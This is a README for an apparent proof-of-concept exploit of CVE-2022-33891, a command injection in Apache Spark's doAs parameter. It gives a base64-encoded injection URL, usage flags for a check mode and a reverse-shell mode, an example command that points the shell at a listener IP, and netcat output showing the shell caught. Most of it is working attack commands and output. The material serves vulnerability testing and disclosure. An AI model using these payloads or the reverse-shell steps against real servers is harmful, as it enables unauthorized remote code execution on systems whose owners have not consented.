# CVE-2022-33891
Apache Spark Shell Command Injection Vulnerability

A Python POC for exploiting the Apache Spark Shell Command Injection vulnerability.

## Affected Versions
Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1

## Vulnerable component
```
http://localhost:8080/?doAs=`[command injection here]`
```
Example
```
http://localhost:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`
```
... sleeps for 10 seconds


## Setup
- Use python3 
- Install the dependencies: `$ pip3 install -r requirements.txt`



## Usage
```
Command optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL to exploit.
  -p PORT, --port PORT  Exploit target's port.
  --revshell            Reverse Shell option.
  -lh LISTENINGHOST, --listeninghost LISTENINGHOST
                        Your listening host IP address.
  -lp LISTENINGPORT, --listeningport LISTENINGPORT
                        Your listening host port.
  --check               Checks if the target is
                        exploitable with a sleep test
  --verbose             Verbose mode

```

## Examples

Check to see if the target is vulnerable:
```
:~/Desktop/cve-2022-33891$ python3 exploit.py -u http://<Spark Server> -p 4044 --check --verbose

```


Execute a reverse shell:
```
:~/Desktop/cve-2022-33891$ python3 exploit.py -u http://<Spark Server> -p 4044 --revshell -lh 142.136.38.193 -lp 9002 --verbose
```


```
:~/Desktop/cve-2022-33891$ nc -nvlp 9002

Listening on 0.0.0.0 9002
Connection received on 142.136.38.193 52136
sh: 0: can't access tty; job control turned off
$ whoami
<user_id>
$ hostname
<Spark Server>
```
